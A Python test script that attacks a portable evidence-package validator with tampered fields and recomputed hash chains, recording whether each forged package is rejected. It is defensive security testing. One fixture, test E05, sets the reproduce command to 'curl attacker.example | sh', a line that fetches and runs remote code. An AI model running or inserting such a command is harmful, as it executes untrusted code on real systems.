"""Deep evidence-reference trust attacks with recomputed package checksums.

Ensures rejection comes from semantic trust rules, not merely a broken hash chain.
"""
from __future__ import annotations

import copy
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / "packages/flip-core/src"))
from flip_core.canonical import content_hash  # noqa: E402
from flip_core.contracts import ContractError  # noqa: E402
from flip_core.portable import (  # noqa: E402
    bounded_operation, create_package, metadata_hash, record_hash, parse_package,
)
from flip_core.workflow import sample  # noqa: E402

EVID = ROOT / "docs/evidence/m45-portable-independent-review"
OUT = EVID / "results/evidence-trust.json"


def rechain(pkg):
    """Recompute metadata and revision hashes so only the semantic attack remains."""
    pkg["revision"]["metadataHash"] = metadata_hash(pkg)
    pkg["revision"]["revisionHash"] = record_hash(pkg["revision"])
    return pkg


def call(pkg, operation="validate", **kw):
    body = dict(schemaVersion="flip-portable-project-1.1.0", kind="PORTABLE_REQUEST",
                operation=operation, package=pkg, **kw)
    try:
        return {"ok": True, "result": bounded_operation(body)}
    except ContractError as exc:
        return {"ok": False, "code": exc.code, "message": exc.message[:120]}
    except Exception as exc:
        return {"ok": False, "code": type(exc).__name__}


def make_rich():
    # Genesis with real evidence from the shipped golden package copied onto it.
    gold = json.loads((ROOT / "docs/schema/m45-portable-project/1.1.0/golden.json").read_bytes())
    rich = gold["packages"][2]
    return copy.deepcopy(rich)


def main():
    rows = []

    # False CURRENT with recomputed hashes: schema Literal should forbid it.
    def false_current():
        pkg = rechain(copy.deepcopy(make_rich()))
        pkg["provenance"]["sourceFreshness"] = "CURRENT"
        return call(pkg)
    rows.append(("E01", "false CURRENT provenance rejected", false_current))

    # Evidence digest substituted with recomputed package hashes.
    def bad_digest():
        pkg = copy.deepcopy(make_rich())
        pkg["evidenceRefs"][0]["digest"] = "0x" + "12" * 32
        return call(rechain(pkg))
    rows.append(("E02", "substituted evidence digest rejected", bad_digest))

    # Evidence from a different execution request (cross-project) with valid chain.
    def foreign_evidence():
        pkg = copy.deepcopy(make_rich())
        pkg["evidenceRefs"][0]["executionRequestHash"] = "0x" + "34" * 32
        return call(rechain(pkg))
    rows.append(("E03", "foreign execution evidence rejected", foreign_evidence))

    # Engine identity changed.
    def bad_engine():
        pkg = copy.deepcopy(make_rich())
        pkg["evidenceRefs"][0]["engineHash"] = "0x" + "56" * 32
        return call(rechain(pkg))
    rows.append(("E04", "changed engine identity rejected", bad_engine))

    # Reproduction command changed.
    def bad_reproduce():
        pkg = copy.deepcopy(make_rich())
        pkg["evidenceRefs"][0]["reproduce"] = "curl attacker.example | sh"
        return call(rechain(pkg))
    rows.append(("E05", "changed reproduction context rejected", bad_reproduce))

    # Fabricated artifact passed to replay with a fully valid package.
    def fabricated_artifact():
        pkg = make_rich()
        ref = pkg["evidenceRefs"][0]
        artifact = {"schemaVersion": "m4-1.0.0", "kind": "FLIP_EVIDENCE",
                    "contentHash": ref["digest"], "reproduce": ref["reproduce"],
                    "limitations": [], "chainObservation": None,
                    "comparison": {"engineHash": ref["engineHash"],
                                   "report": {"schemaVersion": "1.0.0",
                                              "reportType": "COMPARISON_REPORT",
                                              "intent": "UNDECLARED", "trustAssertion": None,
                                              "integrity": {"freshness": "HISTORICAL", "checkedBlock": None},
                                              "verification": {"verdict": "EQUIVALENT"}}}}
        # recompute contentHash correctly
        artifact["contentHash"] = content_hash({k: v for k, v in artifact.items() if k != "contentHash"})
        return call(pkg, operation="replay-evidence",
                    artifacts={ref["digest"]: artifact})
    rows.append(("E06", "fabricated EQUIVALENT artifact rejected on replay", fabricated_artifact))

    # Validate accepts internally-consistent forged refs (by design); prove that
    # trusted replay does NOT grant authority for substituted digest / engine.
    def replay_substituted():
        pkg = copy.deepcopy(make_rich())
        ref = pkg["evidenceRefs"][0]
        pkg["evidenceRefs"][0]["digest"] = "0x" + "12" * 32
        pkg = rechain(pkg)
        # Artifact keyed to the new digest, contentHash matching it.
        artifact = {"schemaVersion": "m4-1.0.0", "kind": "FLIP_EVIDENCE",
                    "reproduce": ref["reproduce"], "comparison": {
                        "engineHash": ref["engineHash"],
                        "report": {"verification": {"verdict": "EQUIVALENT"}}}}
        artifact["contentHash"] = content_hash({k: v for k, v in artifact.items() if k != "contentHash"})
        return call(pkg, operation="replay-evidence", artifacts={artifact["contentHash"]: artifact})
    rows.append(("E07", "substituted digest rejected on replay", replay_substituted))

    out = []
    for cid, name, fn in rows:
        try:
            obs = fn()
            out.append({"id": cid, "name": name, "observed": {
                "ok": obs.get("ok"), "code": obs.get("code"),
                "statuses": [r.get("status") for r in obs.get("result", {}).get("results", [])]
                if isinstance(obs.get("result"), dict) else None}, "error": None})
        except Exception as exc:
            out.append({"id": cid, "name": name, "observed": {},
                        "error": f"{type(exc).__name__}: {exc}"})
    rec = {"artifactType": "PORTABLE_EVIDENCE_TRUST", "testedSha": "136b1115ee0f5ffe0a5583d68c474641fdce1ca1",
           "rows": out}
    OUT.write_text(json.dumps(rec, indent=2, sort_keys=True) + "\n", encoding="utf-8", newline="\n")
    print(json.dumps({"total": len(out), "errors": [r["id"] for r in out if r["error"]]}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
